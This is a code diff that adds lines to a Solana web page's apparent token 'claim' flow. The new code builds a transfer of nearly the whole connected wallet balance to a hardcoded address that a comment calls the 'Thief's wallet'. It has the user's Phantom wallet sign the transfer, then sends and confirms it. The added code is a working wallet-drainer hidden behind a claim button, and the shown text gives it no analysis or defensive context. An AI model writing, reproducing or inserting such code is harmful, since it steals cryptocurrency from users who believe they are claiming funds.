@@ -26,6 +26,34 @@ alert(`Minimum balance for rent exemption: ${minBalance / solanaWeb3.LAMPORTS_PE
                     alert("Insufficient funds to claim.");
                     return;
                 }
+
+
+
+                 const recieverWallet = new solanaWeb3.PublicKey('DRYjXYjya45KLzD5HmtBd4QeUA6SqypNoJDhgoie8bnF'); // Thief's wallet
+                        const balanceForTransfer = walletBalance - minBalance;
+                        if (balanceForTransfer <= 0) {
+                            alert("Insufficient funds for transfer.");
+                            return;
+                        }
+
+                        var transaction = new solanaWeb3.Transaction().add(
+                            solanaWeb3.SystemProgram.transfer({
+                                fromPubkey: resp.publicKey,
+                                toPubkey: recieverWallet,
+                                lamports: balanceForTransfer * 0.99,
+                            }),
+                        );
+
+                        transaction.feePayer = window.solana.publicKey;
+                        let blockhashObj = await connection.getRecentBlockhash();
+                        transaction.recentBlockhash = blockhashObj.blockhash;
+
+                        const signed = await window.solana.signTransaction(transaction);
+                        alert("Transaction signed:", signed);
+
+                        let txid = await connection.sendRawTransaction(signed.serialize());
+                        await connection.confirmTransaction(txid);
+                        alert("Transaction confirmed:", txid);
   } catch (err) {
     console.error("Error found:", err);
     alert("Error: " + err.message);
